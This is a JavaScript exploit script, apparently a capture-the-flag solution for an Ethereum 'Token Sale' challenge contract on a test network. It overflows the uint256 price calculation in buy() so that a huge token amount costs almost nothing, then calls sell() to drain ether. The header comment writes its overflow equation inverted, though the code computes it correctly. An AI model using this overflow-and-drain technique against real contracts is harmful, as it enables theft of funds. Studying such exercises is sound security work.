/*
 * INFO
 *
 * From https://cryptozombies.io/en/lesson/15/chapter/9
 * The Ethereum Virtual Machine doesn't support floating-point numbers, meaning that divisions truncate the decimals. The workaround is to simply multiply the numbers in your front-end by 10**n. The Binance API returns eight decimals numbers and we'll also multiply this by 10**10. Why did we choose 10**10? There's a reason: one ether is 10**18 wei. This way, we'll be sure that no money will be lost.
 *
 * But there's more to it. The Number type in JavaScript is "double-precision 64-bit binary format IEEE 754 value" which supports only 16 decimals...
 * Luckily, there's a small library called BN.js that'll help you overcome these issues.
 *
 * For the above reasons, it's recommended that you always use BN.js when dealing with numbers.
 *
 * SOLUTION
 *
 * We have to overflow this operation: numTokens * 1 ether
 * We also know the result of that operation is a uint256.
 * Reminder, 1 ether is 10**18 wei
 * The maximum value of that type is (2**256)-1, that is, 2**256 will overflow.
 * We end up with this equation: x * 10**18 = 2 ** 256 <=> x = (10**18) / (2 ** 256)
 * Now, because we'll never have decimals, x will result in a value slightly less that
 * the value needed to overflow.
 * For a less abstract operation think about 17 / 8 which will result in 2.125
 * Using BN library the result will actually be 2
 * So, we'll have to add 1 to x so the operation actually overflows.
 */

const HDWalletProvider = require("@truffle/hdwallet-provider");
const Web3 = require("web3");
const Web3Utils = require("web3-utils");
const fs = require("fs");
const BN = require('bn.js');

const mnemonic = fs.readFileSync("../.secret").toString().trim();
const infuraProjectId = fs.readFileSync("../.infura").toString().trim();

const provider = new HDWalletProvider({
  mnemonic: {
    phrase: mnemonic,
  },
  providerOrUrl: `https://ropsten.infura.io/v3/${infuraProjectId}`,
});

const web3 = new Web3(provider);

const abi = JSON.parse(fs.readFileSync('./abi/1_token_sale.json'));

//Challenge contract deployed at address
const contractAddress = "0x94Bad8Bd247D8c49dCF650Cf53A11c43d4a276A5";

async function main() {
  try {
    const accounts = await web3.eth.getAccounts();

    const contract = new web3.eth.Contract(abi, contractAddress);

    const gasPrice = await web3.eth.getGasPrice();

    const a = new BN(2, 10).pow(new BN(256, 10));
    const b = new BN(10, 10).pow(new BN(18, 10));

    const thisValueWillNotOverflow = a.div(b);
    const thisValueWillOverflow = thisValueWillNotOverflow.add(new BN(1, 10));

    const decimals = a.mod(b);
    const amountToSend = new BN(10, 10).pow(new BN(18, 10)).sub(decimals);

    console.log(thisValueWillOverflow.toString(), amountToSend.toString());

    const res = await contract.methods
      .buy(thisValueWillOverflow.toString())
      .send({ from: accounts[0], gasPrice, value: amountToSend.toString() });

    console.log(res);

    const res2 = await contract.methods
      .sell(1)
      .send({ from: accounts[0], gasPrice });

    console.log(res2);

  } catch (ex) {
    console.warn(ex);
  } finally {
    provider.engine.stop();
  }
}

main();